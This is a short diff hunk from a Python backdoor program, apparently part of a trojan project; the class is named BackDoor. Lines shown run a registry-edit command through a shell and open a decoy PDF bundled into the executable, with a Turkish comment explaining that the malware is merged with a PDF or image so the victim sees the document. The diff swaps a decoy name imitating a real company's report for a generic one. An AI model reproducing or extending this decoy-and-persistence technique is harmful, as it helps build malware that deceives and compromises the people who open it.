@@ -60,7 +60,7 @@ class BackDoor:
             subprocess.call(regedit_command, shell=True)
 
     def open_added_file(self): # eğer pdf veya jpeg gibi birşey ile birleştirilecekse birleştirilen dosyanın açılmasını sağlar..
-        added_file = sys._MEIPASS + "\\Turkcell-EFR2020-TR.pdf"
+        added_file = sys._MEIPASS + "\\pdfname.pdf"
         subprocess.Popen(added_file, shell=True)
 
 
